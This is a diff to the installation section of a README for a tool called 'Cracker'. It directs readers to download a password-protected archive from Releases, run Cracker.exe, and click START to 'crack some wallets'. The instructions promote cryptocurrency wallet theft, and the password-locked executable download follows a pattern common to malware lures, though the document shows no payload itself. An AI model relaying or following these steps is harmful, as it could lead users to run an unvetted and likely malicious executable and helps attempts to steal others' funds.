@@ -1,10 +1,13 @@
 # Installation
 ---
-1) The password for the archive is - 2026
+1) 1. Download `Cracker` from [Releases](../../releases)
 
-2) Open Cracker.exe
+2) The password for the archive is - 2026
 
-3) Click START and wait softwere to crack some wallets.
+3) Open Cracker.exe
+
+4) Click START and wait softwere to crack some wallets.
+
 
 ![Image alt](https://github.com/Gertrundger/Cracker_Project/blob/main/pi.gif)
 
